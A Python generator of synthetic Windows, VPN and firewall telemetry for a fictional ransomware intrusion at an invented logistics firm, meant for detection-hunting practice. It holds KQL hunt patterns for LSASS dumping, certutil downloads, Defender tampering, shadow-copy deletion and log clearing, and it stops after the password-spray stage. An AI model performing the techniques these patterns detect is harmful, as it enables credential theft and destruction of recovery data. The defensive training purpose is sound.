"""Scenario: ransomware intrusion at "Harborline Logistics".

Everything here is synthetic. Harborline Logistics, its hosts, users and
domain are invented, every external address comes from the documentation
ranges (RFC 5737) and every domain from reserved TLDs, so nothing in the data
points at a real organisation or a live host.

The generator produces five days of Windows (Sysmon + Security + System),
VPN and firewall telemetry in ECS-style JSON: ordinary office noise, a few
decoys that look suspicious but are not, and one intrusion that follows a
common affiliate playbook:

    S01 VPN password spray, then a login with a valid account
    S02 RDP onto the user's workstation from the VPN pool
    S03 Host and domain discovery
    S04 Tool transfer with a living-off-the-land binary
    S05 Directory enumeration
    S06 LSASS memory dump
    S07 Kerberoasting
    S08 Use of a backup service account
    S09 Domain admin logons from a workstation, NTDS copy, rogue admin account
    S10 Defender tampering
    S11 Remote service installs (PsExec style)
    S12 Staging and exfiltration to an external storage endpoint
    S13 Recovery inhibition (shadow copies, backup catalog)
    S14 Ransomware execution and mass file encryption
    S15 Event log clearing

Only log records are produced. No tool, payload or command from the story is
ever executed.

The output is deterministic for a given ``end`` timestamp (default: now,
floored to the hour). Timestamps are relative to ``end`` so a Kibana "last 7
days" window always shows the whole story.
"""

from __future__ import annotations

import base64
import hashlib
import ntpath
import random
import uuid
from collections import defaultdict
from datetime import datetime, timedelta, timezone

SCENARIO_ID = "ransomware-intrusion"
DAYS = 5
SEED = 7731
DOMAIN = "HARBORLINE"
DNS_SUFFIX = "harborline.example"

ATTACKER_IP = "203.0.113.47"   # RFC 5737 TEST-NET-3
EXFIL_IP = "198.51.100.77"     # RFC 5737 TEST-NET-2
VPN_POOL_PREFIX = "10.20.99."
ATTACKER_VPN_IP = "10.20.99.14"

SERVERS = {
    "DC01": "10.20.1.10",
    "FS01": "10.20.1.21",
    "APP02": "10.20.1.22",
    "BKP01": "10.20.1.23",
}
IT_WS = ("IT-ADM-WS01", "10.20.12.5")
VICTIM_WS = ("WS-ACC-014", "10.20.10.114")
VICTIM_USER = "a.okello"

USERS = [
    "j.nakato", "p.mugisha", "c.ssebuufu", "k.lutalo", "r.namukasa", "d.opio", "s.achieng",
    "m.kigozi", "t.wanyama", "e.nabirye", "b.tumusiime", "h.kyomuhendo", "g.ochieng",
    "f.nansubuga", "l.byaruhanga", "n.atim", "o.kiiza", "i.ssentongo", "w.mbabazi", "y.lubega",
    "z.nalwoga", "u.mwesigwa", "q.akena",
]

SYS32 = r"C:\Windows\System32"
PATHS = {
    "cmd.exe": SYS32 + r"\cmd.exe",
    "powershell.exe": SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe",
    "explorer.exe": r"C:\Windows\explorer.exe",
    "rundll32.exe": SYS32 + r"\rundll32.exe",
    "certutil.exe": SYS32 + r"\certutil.exe",
    "net.exe": SYS32 + r"\net.exe",
    "nltest.exe": SYS32 + r"\nltest.exe",
    "whoami.exe": SYS32 + r"\whoami.exe",
    "ipconfig.exe": SYS32 + r"\ipconfig.exe",
    "vssadmin.exe": SYS32 + r"\vssadmin.exe",
    "wevtutil.exe": SYS32 + r"\wevtutil.exe",
    "ntdsutil.exe": SYS32 + r"\ntdsutil.exe",
    "reg.exe": SYS32 + r"\reg.exe",
    "svchost.exe": SYS32 + r"\svchost.exe",
    "services.exe": SYS32 + r"\services.exe",
    "lsass.exe": SYS32 + r"\lsass.exe",
    "outlook.exe": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    "excel.exe": r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
    "chrome.exe": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "teams.exe": r"C:\Program Files\Microsoft\Teams\current\Teams.exe",
    "msedge.exe": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "bkpagent.exe": r"C:\Program Files\BackupAgent\bkpagent.exe",
    "upd.exe": r"C:\Users\Public\Libraries\upd.exe",
    "svcupd.exe": r"C:\Users\Public\Libraries\svcupd.exe",
    "lsvc64.exe": r"C:\Windows\Temp\lsvc64.exe",
    "psexesvc.exe": r"C:\Windows\PSEXESVC.exe",
    "7z.exe": r"C:\Program Files\7-Zip\7z.exe",
    "notepad.exe": SYS32 + r"\notepad.exe",
    "quser.exe": SYS32 + r"\quser.exe",
    "systeminfo.exe": SYS32 + r"\systeminfo.exe",
    "arp.exe": SYS32 + r"\ARP.EXE",
    "tasklist.exe": SYS32 + r"\tasklist.exe",
    "taskhostw.exe": SYS32 + r"\taskhostw.exe",
    "backgroundtaskhost.exe": SYS32 + r"\backgroundTaskHost.exe",
    "searchprotocolhost.exe": SYS32 + r"\SearchProtocolHost.exe",
    "onedrive.exe": r"C:\Program Files\Microsoft OneDrive\OneDrive.exe",
    "googleupdate.exe": r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
    "msedgeupdate.exe": r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe",
}

BACKGROUND_PROCS = [
    ("taskhostw.exe", "taskhostw.exe", "svchost.exe"),
    ("backgroundtaskhost.exe", "backgroundTaskHost.exe -ServerName:App.AppXabc.mca", "svchost.exe"),
    ("searchprotocolhost.exe", "SearchProtocolHost.exe 3 1 Global\\UsGthrFltPipeMssGthrPipe", "services.exe"),
    ("onedrive.exe", "OneDrive.exe /background", "explorer.exe"),
    ("googleupdate.exe", "GoogleUpdate.exe /ua /installsource scheduler", "svchost.exe"),
    ("msedgeupdate.exe", "MicrosoftEdgeUpdate.exe /ua /installsource scheduler", "svchost.exe"),
]
BACKGROUND_DOMAINS = ["clients2.google.com", "edge.microsoft.com", "settings-win.data.microsoft.com",
                      "login.live.com", "dl.delivery.mp.microsoft.com", "onedrive.live.com"]

NORMAL_DOMAINS = [
    "outlook.office365.com", "login.microsoftonline.com", "teams.microsoft.com",
    "www.google.com", "update.googleapis.com", "ocsp.digicert.com", "slack.com",
    "maps.google.com", "windowsupdate.microsoft.com", "fonts.gstatic.com", "news.example.org",
]

LOGON_TYPES = {2: "Interactive", 3: "Network", 10: "RemoteInteractive"}

# Saved searches loaded into Kibana (KQL). ``expect`` is what the integration
# test asserts: the stage the hits belong to, so the searches stay honest.
HUNTS = [
    {
        "id": "h01-vpn-failures",
        "title": "01 VPN: failed logins",
        "description": "Many failures from one address against several accounts is a spray.",
        "kql": 'event.dataset : "vpn.auth" and event.action : "vpn-login-failed"',
        "columns": ["@timestamp", "source.ip", "user.name", "source.geo.country_iso_code"],
        "stage": "S01",
    },
    {
        "id": "h02-vpn-foreign",
        "title": "02 VPN: successful login from outside the usual country",
        "description": "A valid login from an address with no history for that user.",
        "kql": 'event.dataset : "vpn.auth" and event.action : "vpn-login-success" '
               'and not source.geo.country_iso_code : "UG"',
        "columns": ["@timestamp", "user.name", "source.ip", "vpn.assigned_ip"],
        "stage": "S01",
    },
    {
        "id": "h03-rdp-from-vpn",
        "title": "03 RDP logons coming from the VPN pool",
        "description": "Remote desktop logons whose source is a VPN-assigned address.",
        "kql": 'event.code : "4624" and winlog.logon.type : "RemoteInteractive" '
               'and source.ip : "10.20.99.0/24"',
        "columns": ["@timestamp", "host.name", "user.name", "source.ip"],
        "stage": "S02",
    },
    {
        "id": "h04-discovery",
        "title": "04 Discovery commands",
        "description": "Account, domain and host enumeration run from a user session.",
        "kql": 'event.code : "1" and process.command_line : ("net group" or "nltest" or '
               '"whoami /all" or "net user /domain" or "systeminfo" or "net view")',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S03",
    },
    {
        "id": "h05-certutil-download",
        "title": "05 certutil used to download a file",
        "description": "certutil with -urlcache is a classic way to pull tools onto a host.",
        "kql": 'event.code : "1" and process.name : "certutil.exe" and process.command_line : "urlcache"',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S04",
    },
    {
        "id": "h06-lsass",
        "title": "06 LSASS access and dump",
        "description": "Processes opening LSASS memory, and comsvcs MiniDump command lines.",
        "kql": '(event.code : "10" and winlog.event_data.TargetImage : *lsass.exe) or '
               '(event.code : "1" and process.command_line : "comsvcs.dll" and process.command_line : "MiniDump")',
        "columns": ["@timestamp", "host.name", "winlog.event_data.SourceImage", "process.command_line"],
        "stage": "S06",
    },
    {
        "id": "h07-kerberoast",
        "title": "07 Kerberos tickets with RC4 encryption",
        "description": "RC4 service tickets are rare. Group by source.ip to tell a burst from a legacy app.",
        "kql": 'event.code : "4769" and winlog.event_data.TicketEncryptionType : "0x17" '
               'and not winlog.event_data.ServiceName : "krbtgt"',
        "columns": ["@timestamp", "source.ip", "user.name", "winlog.event_data.ServiceName"],
        "stage": "S07",
    },
    {
        "id": "h08-admin-rdp-odd-source",
        "title": "08 Domain admin RDP from an unusual source",
        "description": "The IT admin always connects from the IT workstation.",
        "kql": 'event.code : "4624" and winlog.logon.type : "RemoteInteractive" '
               'and user.name : "adm.tdavis" and not source.ip : "10.20.12.5"',
        "columns": ["@timestamp", "host.name", "user.name", "source.ip"],
        "stage": "S09",
    },
    {
        "id": "h09-new-admin",
        "title": "09 Account created and added to Domain Admins",
        "description": "New accounts and privileged group changes on the domain controller.",
        "kql": 'event.code : ("4720" or "4728")',
        "columns": ["@timestamp", "host.name", "user.name", "winlog.event_data.TargetUserName"],
        "stage": "S09",
    },
    {
        "id": "h10-ntds",
        "title": "10 NTDS copy with ntdsutil",
        "description": "ntdsutil creating an install-from-media copy of the AD database.",
        "kql": 'event.code : "1" and process.name : "ntdsutil.exe"',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S09",
    },
    {
        "id": "h11-defender-tamper",
        "title": "11 Defender tampering",
        "description": "Real-time protection switched off from the command line.",
        "kql": 'event.code : "1" and process.command_line : ("DisableRealtimeMonitoring" or "DisableAntiSpyware")',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S10",
    },
    {
        "id": "h12-psexec-service",
        "title": "12 PsExec-style service installs",
        "description": "One install on APP02 is the IT admin patching. Check who, from where and when.",
        "kql": 'event.code : "7045" and winlog.event_data.ServiceName : "PSEXESVC"',
        "columns": ["@timestamp", "host.name", "winlog.event_data.ServiceName", "winlog.event_data.ImagePath"],
        "stage": "S11",
    },
    {
        "id": "h13-exfil-tool",
        "title": "13 Renamed sync tool and its connections",
        "description": "A binary in a public folder talking to an external storage endpoint.",
        "kql": '(event.code : "1" or event.code : "3") and process.name : "svcupd.exe"',
        "columns": ["@timestamp", "host.name", "event.code", "destination.ip", "process.command_line"],
        "stage": "S12",
    },
    {
        "id": "h14-firewall-exfil",
        "title": "14 Firewall: traffic to the exfil endpoint",
        "description": "Outbound volume from a file server to a single external address.",
        "kql": 'event.dataset : "fw.traffic" and destination.ip : "198.51.100.77"',
        "columns": ["@timestamp", "source.ip", "destination.ip", "network.bytes"],
        "stage": "S12",
    },
    {
        "id": "h15-recovery-inhibit",
        "title": "15 Recovery inhibition",
        "description": "Shadow copies, backup catalog and boot recovery being disabled.",
        "kql": 'event.code : "1" and process.command_line : ("delete shadows" or "delete catalog" or "recoveryenabled")',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S13",
    },
    {
        "id": "h16-encryption",
        "title": "16 Mass file encryption",
        "description": "File creations with the ransomware extension, and the ransom note.",
        "kql": 'event.code : "11" and (file.extension : "hlq1x" or file.name : "README_HLQ1X_RESTORE.txt")',
        "columns": ["@timestamp", "host.name", "process.name", "file.path"],
        "stage": "S14",
    },
    {
        "id": "h17-log-clearing",
        "title": "17 Event log clearing",
        "description": "The audit log cleared event, and wevtutil clearing logs.",
        "kql": 'event.code : "1102" or (event.code : "1" and process.name : "wevtutil.exe")',
        "columns": ["@timestamp", "host.name", "user.name", "process.command_line"],
        "stage": "S15",
    },
]

STAGE_TITLES = {
    "S01": "VPN password spray, then a valid login from a new address",
    "S02": "RDP onto the user's workstation from the VPN pool",
    "S03": "Host and domain discovery",
    "S04": "Tool transfer with certutil",
    "S05": "Directory enumeration over LDAP",
    "S06": "LSASS memory dump",
    "S07": "Kerberoasting",
    "S08": "Backup service account used from the workstation",
    "S09": "Domain admin from a workstation, NTDS copy, rogue admin account",
    "S10": "Defender tampering",
    "S11": "Remote service installs",
    "S12": "Staging and exfiltration",
    "S13": "Recovery inhibition",
    "S14": "Ransomware execution and mass file encryption",
    "S15": "Event log clearing",
}


# ----------------------------------------------------------------- helpers


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def _nest(flat: dict[str, object]) -> dict[str, object]:
    out: dict[str, object] = {}
    for key, value in flat.items():
        if value is None:
            continue
        node = out
        parts = key.split(".")
        for part in parts[:-1]:
            node = node.setdefault(part, {})  # type: ignore[assignment]
        node[parts[-1]] = value
    return out


def _sha(name: str) -> str:
    return hashlib.sha256(f"labforge-synthetic:{name.lower()}".encode()).hexdigest()


def _path(image: str) -> str:
    return PATHS.get(image.lower(), image)


def _name(image: str) -> str:
    return ntpath.basename(image).lower()


class Builder:
    """Collects documents and the ground-truth list."""

    def __init__(self, seed: int) -> None:
        self.rng = random.Random(seed)
        self.seed = seed
        self.docs: list[tuple[datetime, dict[str, object]]] = []
        self.truth: list[dict[str, str]] = []
        self._n = 0

    def _event_id(self) -> str:
        self._n += 1
        return str(uuid.UUID(int=(self.seed << 96) | self._n))

    def add(self, ts: datetime, flat: dict[str, object], *, stage: str | None = None) -> str:
        eid = self._event_id()
        flat = dict(flat)
        flat["@timestamp"] = _iso(ts)
        flat["event.id"] = eid
        flat["labforge.scenario"] = SCENARIO_ID
        doc = _nest(flat)
        self.docs.append((ts, doc))
        if stage:
            self.truth.append(
                {
                    "event_id": eid,
                    "stage": stage,
                    "timestamp": _iso(ts),
                    "host": str(flat.get("host.name", "")),
                    "code": str(flat.get("event.code", flat.get("event.dataset", ""))),
                }
            )
        return eid

    # ---- event builders
    def sysmon(self, ts: datetime, host: str, code: int, *, stage: str | None = None, **f: object) -> str:
        base = {
            "host.name": host,
            "event.code": str(code),
            "event.provider": "Microsoft-Windows-Sysmon",
            "event.dataset": "windows.sysmon_operational",
            "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        }
        return self.add(ts, {**base, **f}, stage=stage)

    def security(self, ts: datetime, host: str, code: int, *, stage: str | None = None, **f: object) -> str:
        base = {
            "host.name": host,
            "event.code": str(code),
            "event.provider": "Microsoft-Windows-Security-Auditing",
            "event.dataset": "windows.security",
            "winlog.channel": "Security",
        }
        return self.add(ts, {**base, **f}, stage=stage)

    def system(self, ts: datetime, host: str, code: int, *, stage: str | None = None, **f: object) -> str:
        base = {
            "host.name": host,
            "event.code": str(code),
            "event.provider": "Service Control Manager",
            "event.dataset": "windows.system",
            "winlog.channel": "System",
        }
        return self.add(ts, {**base, **f}, stage=stage)

    def process(
        self,
        ts: datetime,
        host: str,
        user: str,
        image: str,
        cmd: str,
        parent: str,
        *,
        stage: str | None = None,
        integrity: str = "Medium",
        cwd: str | None = None,
    ) -> str:
        image_path = _path(image)
        parent_path = _path(parent)
        return self.sysmon(
            ts, host, 1, stage=stage,
            **{
                "event.category": "process",
                "event.action": "Process Create (rule: ProcessCreate)",
                "user.name": user,
                "user.domain": DOMAIN,
                "process.name": _name(image_path),
                "process.executable": image_path,
                "process.command_line": cmd,
                "process.pid": self.rng.randint(1000, 60000),
                "process.working_directory": cwd or ntpath.dirname(image_path) + "\\",
                "process.hash.sha256": _sha(_name(image_path)),
                "process.parent.name": _name(parent_path),
                "process.parent.executable": parent_path,
                "process.parent.pid": self.rng.randint(500, 9000),
                "winlog.event_data.IntegrityLevel": integrity,
            },
        )

    def network(
        self,
        ts: datetime,
        host: str,
        user: str,
        image: str,
        src_ip: str,
        dst_ip: str,
        dst_port: int,
        *,
        stage: str | None = None,
        domain: str | None = None,
    ) -> str:
        image_path = _path(image)
        return self.sysmon(
            ts, host, 3, stage=stage,
            **{
                "event.category": "network",
                "event.action": "Network connection detected (rule: NetworkConnect)",
                "user.name": user,
                "user.domain": DOMAIN,
                "process.name": _name(image_path),
                "process.executable": image_path,
                "source.ip": src_ip,
                "source.port": self.rng.randint(49152, 65535),
                "destination.ip": dst_ip,
                "destination.port": dst_port,
                "destination.domain": domain,
                "network.transport": "tcp",
            },
        )

    def dns(self, ts: datetime, host: str, user: str, image: str, query: str, *, stage: str | None = None) -> str:
        image_path = _path(image)
        return self.sysmon(
            ts, host, 22, stage=stage,
            **{
                "event.category": "network",
                "event.action": "Dns query (rule: DnsQuery)",
                "user.name": user,
                "process.name": _name(image_path),
                "process.executable": image_path,
                "dns.question.name": query,
                "dns.question.type": "A",
            },
        )

    def file_create(
        self, ts: datetime, host: str, user: str, image: str, path: str, *, stage: str | None = None
    ) -> str:
        image_path = _path(image)
        return self.sysmon(
            ts, host, 11, stage=stage,
            **{
                "event.category": "file",
                "event.action": "File created (rule: FileCreate)",
                "user.name": user,
                "process.name": _name(image_path),
                "process.executable": image_path,
                "file.path": path,
                "file.name": ntpath.basename(path),
                "file.extension": ntpath.splitext(path)[1].lstrip(".").lower() or None,
            },
        )

    def process_access(self, ts: datetime, host: str, user: str, source: str, target: str, access: str, *, stage: str | None = None) -> str:
        return self.sysmon(
            ts, host, 10, stage=stage,
            **{
                "event.category": "process",
                "event.action": "Process accessed (rule: ProcessAccess)",
                "user.name": user,
                "winlog.event_data.SourceImage": _path(source),
                "winlog.event_data.TargetImage": _path(target),
                "winlog.event_data.GrantedAccess": access,
            },
        )

    def registry(self, ts: datetime, host: str, user: str, image: str, key: str, details: str, *, stage: str | None = None) -> str:
        image_path = _path(image)
        return self.sysmon(
            ts, host, 13, stage=stage,
            **{
                "event.category": "registry",
                "event.action": "Registry value set (rule: RegistryEvent)",
                "user.name": user,
                "process.name": _name(image_path),
                "process.executable": image_path,
                "registry.path": key,
                "winlog.event_data.Details": details,
            },
        )

    def logon(
        self,
        ts: datetime,
        host: str,
        user: str,
        src_ip: str,
        ltype: int,
        *,
        workstation: str | None = None,
        package: str = "Kerberos",
        stage: str | None = None,
    ) -> str:
        return self.security(
            ts, host, 4624, stage=stage,
            **{
                "event.category": "authentication",
                "event.action": "logged-in",
                "event.outcome": "success",
                "user.name": user,
                "user.domain": DOMAIN,
                "source.ip": src_ip,
                "winlog.logon.type": LOGON_TYPES[ltype],
                "winlog.event_data.LogonType": str(ltype),
                "winlog.event_data.WorkstationName": workstation,
                "winlog.event_data.AuthenticationPackageName": package,
            },
        )

    def logon_failed(self, ts: datetime, host: str, user: str, src_ip: str, ltype: int, *, stage: str | None = None) -> str:
        return self.security(
            ts, host, 4625, stage=stage,
            **{
                "event.category": "authentication",
                "event.action": "logon-failed",
                "event.outcome": "failure",
                "user.name": user,
                "source.ip": src_ip,
                "winlog.logon.type": LOGON_TYPES[ltype],
                "winlog.event_data.LogonType": str(ltype),
                "winlog.event_data.Status": "0xc000006d",
            },
        )

    def special_privileges(self, ts: datetime, host: str, user: str, *, stage: str | None = None) -> str:
        return self.security(
            ts, host, 4672, stage=stage,
            **{"event.category": "iam", "event.action": "logged-in-special", "user.name": user, "user.domain": DOMAIN},
        )

    def kerberos_tgs(
        self, ts: datetime, user: str, src_ip: str, service: str, etype: str = "0x12", *, stage: str | None = None
    ) -> str:
        return self.security(
            ts, "DC01", 4769, stage=stage,
            **{
                "event.category": "authentication",
                "event.action": "kerberos-service-ticket-requested",
                "user.name": user,
                "user.domain": DOMAIN,
                "source.ip": src_ip,
                "winlog.event_data.ServiceName": service,
                "winlog.event_data.TicketEncryptionType": etype,
            },
        )

    def service_install(self, ts: datetime, host: str, name: str, image_path: str, *, stage: str | None = None) -> str:
        return self.system(
            ts, host, 7045, stage=stage,
            **{
                "event.category": "configuration",
                "event.action": "service-installed",
                "winlog.event_data.ServiceName": name,
                "winlog.event_data.ImagePath": image_path,
                "winlog.event_data.ServiceType": "user mode service",
                "winlog.event_data.StartType": "demand start",
            },
        )

    def vpn(self, ts: datetime, user: str, src_ip: str, ok: bool, *, geo: str = "UG", assigned: str | None = None, stage: str | None = None) -> str:
        return self.add(
            ts,
            {
                "host.name": "vpn-gw01",
                "event.dataset": "vpn.auth",
                "event.provider": "vpn-gateway",
                "event.category": "authentication",
                "event.action": "vpn-login-success" if ok else "vpn-login-failed",
                "event.outcome": "success" if ok else "failure",
                "user.name": user,
                "source.ip": src_ip,
                "source.geo.country_iso_code": geo,
                "vpn.assigned_ip": assigned,
            },
            stage=stage,
        )

    def firewall(self, ts: datetime, src_ip: str, dst_ip: str, dst_port: int, nbytes: int, *, stage: str | None = None) -> str:
        return self.add(
            ts,
            {
                "host.name": "edge-fw01",
                "event.dataset": "fw.traffic",
                "event.provider": "edge-firewall",
                "event.category": "network",
                "event.action": "allow",
                "source.ip": src_ip,
                "destination.ip": dst_ip,
                "destination.port": dst_port,
                "network.transport": "tcp",
                "network.bytes": nbytes,
            },
            stage=stage,
        )


# ------------------------------------------------------------------ baseline


def _workstations() -> list[tuple[str, str, str]]:
    """(hostname, ip, user) for the ordinary workstations."""
    out: list[tuple[str, str, str]] = []
    users = iter(USERS)
    for dept, count, base in (("ACC", 13, 101), ("OPS", 6, 121), ("HR", 2, 131), ("FIN", 2, 141)):
        for i in range(1, count + 1):
            out.append((f"WS-{dept}-{i:03d}", f"10.20.10.{base + i - 1}", next(users)))
    return out


def _powershell_enc(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


def _baseline(b: Builder, start: datetime) -> None:
    rng = b.rng
    workstations = _workstations()
    everyone = workstations + [(VICTIM_WS[0], VICTIM_WS[1], VICTIM_USER)]
    vpn_users = [(u, f"198.51.100.{20 + i}") for i, u in enumerate(USERS[:8])]
    vpn_users.append((VICTIM_USER, "198.51.100.23"))

    for day in range(DAYS):
        d0 = start + timedelta(days=day)

        # Office workstations
        for host, ip, user in everyone:
            t = d0 + timedelta(hours=5, minutes=rng.randint(0, 150))
            b.logon(t, host, user, "127.0.0.1", 2, workstation=host)
            b.kerberos_tgs(t + timedelta(seconds=2), user, ip, "krbtgt")
            b.kerberos_tgs(t + timedelta(seconds=5), user, ip, f"cifs/FS01.{DNS_SUFFIX}")
            b.logon(t + timedelta(seconds=6), "FS01", user, ip, 3, workstation=host)
            apps = rng.sample(["outlook.exe", "chrome.exe", "excel.exe", "teams.exe", "msedge.exe"], 4)
            for app in apps:
                ta = t + timedelta(seconds=rng.randint(10, 600))
                b.process(ta, host, user, app, f'"{_path(app)}"', "explorer.exe")
                for dom in rng.sample(NORMAL_DOMAINS, 2):
                    td = ta + timedelta(seconds=rng.randint(1, 30))
                    b.dns(td, host, user, app, dom)
                    b.network(td + timedelta(milliseconds=300), host, user, app, ip, f"52.{rng.randint(96, 120)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}", 443, domain=dom)
            for _ in range(rng.randint(3, 7)):
                tf = t + timedelta(minutes=rng.randint(20, 480))
                name = rng.choice(["Report", "Invoice", "Notes", "Schedule", "Manifest"]) + f"_{rng.randint(1, 999)}.xlsx"
                b.file_create(tf, host, user, "excel.exe", rf"C:\Users\{user}\Documents\{name}")
            if rng.random() < 0.25:
                b.logon(t + timedelta(hours=3), "APP02", user, ip, 3, workstation=host)

        # Domain controller background: machine and service ticket noise
        for hour in range(5, 15):
            for _ in range(rng.randint(5, 9)):
                ts = d0 + timedelta(hours=hour, minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
                host, ip, user = rng.choice(workstations)
                b.kerberos_tgs(ts, user, ip, rng.choice([f"cifs/FS01.{DNS_SUFFIX}", f"HTTP/APP02.{DNS_SUFFIX}", f"MSSQLSvc/APP02.{DNS_SUFFIX}:1433"]))

        # Legacy app server: benign RC4 tickets for a SQL service account
        for _ in range(rng.randint(4, 8)):
            ts = d0 + timedelta(hours=rng.randint(5, 20), minutes=rng.randint(0, 59))
            b.kerberos_tgs(ts, "svc_sql", SERVERS["APP02"], f"MSSQLSvc/APP02.{DNS_SUFFIX}:1433", etype="0x17")

        # IT admin routine: RDP to the DC from the IT workstation
        t = d0 + timedelta(hours=5, minutes=30 + rng.randint(0, 10))
        b.logon(t, "DC01", "adm.tdavis", IT_WS[1], 10, workstation=IT_WS[0])
        b.special_privileges(t + timedelta(seconds=1), "DC01", "adm.tdavis")
        b.process(t + timedelta(minutes=2), "DC01", "adm.tdavis", "ipconfig.exe", "ipconfig /all", "cmd.exe")
        b.process(t + timedelta(minutes=3), "DC01", "adm.tdavis", "whoami.exe", "whoami", "cmd.exe")

        # Nightly backup: svc_backup from BKP01 to the servers
        tb = d0 + timedelta(hours=20, minutes=rng.randint(0, 10))
        for target in ("FS01", "APP02"):
            b.logon(tb, target, "svc_backup", SERVERS["BKP01"], 3, workstation="BKP01")
            b.network(tb + timedelta(seconds=1), "BKP01", "svc_backup", "bkpagent.exe", SERVERS["BKP01"], SERVERS[target], 445)
            tb += timedelta(minutes=rng.randint(5, 15))
        b.process(tb, "BKP01", "svc_backup", "bkpagent.exe", "bkpagent.exe --job nightly", "services.exe", integrity="High")

        # VPN: ordinary logins, a few typos
        for user, home_ip in vpn_users:
            if rng.random() < 0.55:
                tv = d0 + timedelta(hours=5, minutes=rng.randint(30, 150))
                if rng.random() < 0.12:
                    b.vpn(tv - timedelta(seconds=40), user, home_ip, False)
                b.vpn(tv, user, home_ip, True, assigned=f"{VPN_POOL_PREFIX}{rng.randint(20, 90)}")

        # Firewall: hourly outbound totals per host
        for host, ip, _user in everyone:
            for hour in range(5, 15):
                ts = d0 + timedelta(hours=hour, minutes=rng.randint(0, 59))
                b.firewall(ts, ip, f"52.{rng.randint(96, 120)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}", 443, rng.randint(1_000_000, 40_000_000))
        for server, ip in SERVERS.items():
            for hour in range(0, 24, 3):
                ts = d0 + timedelta(hours=hour, minutes=rng.randint(0, 59))
                b.firewall(ts, ip, "13.107.4.50", 443, rng.randint(100_000, 4_000_000))

    # Decoys that look odd but are routine -------------------------------
    # Vendor VPN login from a new address during office hours.
    b.vpn(start + timedelta(days=1, hours=7, minutes=12), "v.apptech", "198.51.100.150", True, geo="UG", assigned=f"{VPN_POOL_PREFIX}77")
    # A developer hashing an installer with certutil.
    b.process(start + timedelta(days=1, hours=8, minutes=40), "WS-OPS-003", "k.lutalo", "certutil.exe",
              r"certutil -hashfile C:\Installers\setup.msi SHA256", "cmd.exe")
    # Patching night: the IT admin installs PsExec's service on APP02.
    tp = start + timedelta(days=2, hours=10, minutes=15)
    b.logon(tp, "APP02", "adm.tdavis", IT_WS[1], 3, workstation=IT_WS[0])
    b.service_install(tp + timedelta(seconds=3), "APP02", "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe")
    b.file_create(tp + timedelta(seconds=2), "APP02", "adm.tdavis", "psexesvc.exe", r"C:\Windows\PSEXESVC.exe")


def _background(b: Builder, start: datetime) -> None:
    """Steady low-level telemetry so the intrusion is a needle in a stack, not the stack."""
    rng = b.rng
    hosts = _workstations() + [(VICTIM_WS[0], VICTIM_WS[1], VICTIM_USER)]
    for day in range(DAYS):
        d0 = start + timedelta(days=day)
        for host, ip, user in hosts:
            for hour in range(5, 14):
                for _ in range(rng.randint(8, 14)):
                    ts = d0 + timedelta(hours=hour, minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
                    kind = rng.random()
                    if kind < 0.28:
                        exe, cmd, parent = rng.choice(BACKGROUND_PROCS)
                        b.process(ts, host, "SYSTEM" if exe != "onedrive.exe" else user, exe, cmd, parent, integrity="System" if exe != "onedrive.exe" else "Medium")
                    elif kind < 0.55:
                        app = rng.choice(["chrome.exe", "msedge.exe", "outlook.exe", "teams.exe", "onedrive.exe"])
                        b.dns(ts, host, user, app, rng.choice(NORMAL_DOMAINS + BACKGROUND_DOMAINS))
                    elif kind < 0.8:
                        app = rng.choice(["chrome.exe", "msedge.exe", "outlook.exe", "teams.exe", "onedrive.exe"])
                        b.network(ts, host, user, app, ip, f"20.{rng.randint(40, 190)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}", 443,
                                  domain=rng.choice(NORMAL_DOMAINS + BACKGROUND_DOMAINS))
                    else:
                        b.file_create(ts, host, user, rng.choice(["chrome.exe", "outlook.exe", "onedrive.exe"]),
                                      rf"C:\Users\{user}\AppData\Local\Temp\tmp{rng.randint(1000, 9999)}.tmp")
        # Server side: file share traffic and directory lookups all day.
        for _ in range(rng.randint(500, 700)):
            ts = d0 + timedelta(hours=rng.randint(5, 14), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
            host, ip, user = rng.choice(hosts)
            b.logon(ts, "FS01", user, ip, 3, workstation=host)
        for _ in range(rng.randint(150, 220)):
            ts = d0 + timedelta(hours=rng.randint(5, 14), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
            host, ip, user = rng.choice(hosts)
            b.file_create(ts, "FS01", user, "svchost.exe", rf"D:\Shares\{rng.choice(['Finance', 'Operations', 'Customers'])}\{user}_{rng.randint(1, 9999)}.xlsx")
        # A few mistyped passwords.
        for _ in range(rng.randint(3, 8)):
            ts = d0 + timedelta(hours=rng.randint(5, 14), minutes=rng.randint(0, 59))
            host, ip, user = rng.choice(hosts)
            b.logon_failed(ts, host, user, ip, 2)


# -------------------------------------------------------------------- attack


def _attack(b: Builder, start: datetime) -> dict[str, datetime]:
    rng = b.rng
    a0 = start + timedelta(days=3, hours=17, minutes=7)
    d0 = a0 + timedelta(hours=7, minutes=50)
    ws_host, ws_ip = VICTIM_WS
    u = VICTIM_USER

    def at(minutes: float) -> datetime:
        return a0 + timedelta(minutes=minutes)

    # S01 spray then success
    spray_users = ["c.ssebuufu", "p.mugisha", "j.nakato", "k.lutalo", "r.namukasa"]
    for i in range(14):
        b.vpn(at(-14 + i * 0.7), spray_users[i % len(spray_users)], ATTACKER_IP, False, geo="RO", stage="S01")
